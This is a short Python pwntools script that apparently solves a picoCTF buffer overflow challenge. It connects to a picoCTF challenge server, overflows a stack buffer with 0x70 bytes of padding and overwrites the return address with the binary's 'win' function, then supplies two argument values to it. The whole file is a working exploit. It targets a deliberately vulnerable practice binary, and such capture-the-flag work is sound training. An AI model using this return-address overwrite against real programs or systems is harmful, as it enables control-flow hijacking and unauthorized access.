from pwn import *

p = remote('saturn.picoctf.net', 58576)
e = ELF('./vuln')

payload = b'A' * 0x70
payload += p32(e.symbols['win'])
payload += b'BBBB'
payload += p32(0xCAFEF00D)
payload += p32(0xF00DF00D)

p.sendline(payload)
p.interactive()
